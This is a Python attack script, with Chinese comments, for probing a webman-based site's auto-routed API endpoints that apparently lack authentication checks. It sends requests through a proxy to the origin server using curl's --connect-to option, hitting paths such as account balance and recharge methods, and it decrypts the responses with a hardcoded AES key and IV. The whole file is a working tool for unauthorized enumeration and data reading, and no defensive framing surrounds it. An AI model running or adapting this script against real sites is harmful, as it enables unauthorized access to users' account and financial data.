#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""webman 自动路由未授权接口普查 + 响应解密"""
import subprocess, re, base64, json
PROXY="http://127.0.0.1:7892"; SRC="203.0.113.88"
KEY=b"QD2024SecretKey1234567890ABCDEF0"; IV=b"QD2024IV12345678"
from Crypto.Cipher import AES

def call(vh, path, method="GET", body=None):
    cmd=["curl.exe","-x",PROXY,"-k","-s","-i","--max-time","22",
         "--connect-to","%s:443:%s:443"%(vh,SRC),"-X",method,
         "-H","User-Agent: Mozilla/5.0","-H","X-Requested-With: XMLHttpRequest"]
    if body is not None: cmd+=["-H","Content-Type: application/json","--data-binary",body]
    cmd.append("https://%s%s"%(vh,path))
    r=subprocess.run(cmd,capture_output=True,timeout=40).stdout.decode("utf-8","replace")
    t=r.replace("\r\n","\n")
    bs=re.split(r"(?m)^HTTP/1\.1 (\d{3})",t)          # 跳过代理 CONNECT 块，取最后一个真实状态行
    code=bs[-2] if len(bs)>=3 else "?"
    body_out=bs[-1].partition("\n\n")[2].strip() if len(bs)>=3 else t
    dec=None
    if re.fullmatch(r"[A-Za-z0-9+/=]{16,}", body_out or ""):
        raw=base64.b64decode(body_out)
        if raw and len(raw)%16==0:
            o=AES.new(KEY,AES.MODE_CBC,IV).decrypt(raw); p=o[-1]
            if 1<=p<=16: o=o[:-p]
            s=o.decode("utf-8","replace")
            if s.lstrip()[:1] in "{[": dec=s
    return code, body_out, dec

# 用法：把源码里所有「无 $request->userId 判定」的控制器方法名按 /api/<controller>/<action> 形式批量探测
for p in ["/api/collector/status","/api/recharge/methods","/api/game/platforms",
          "/api/yuebao/config","/api/levelReward/getLevelConfigs","/api/index/index",
          "/api/account/balance"]:
    c,b,d=call("example.com",p)
    print(c,p,"->",(d or b)[:160])
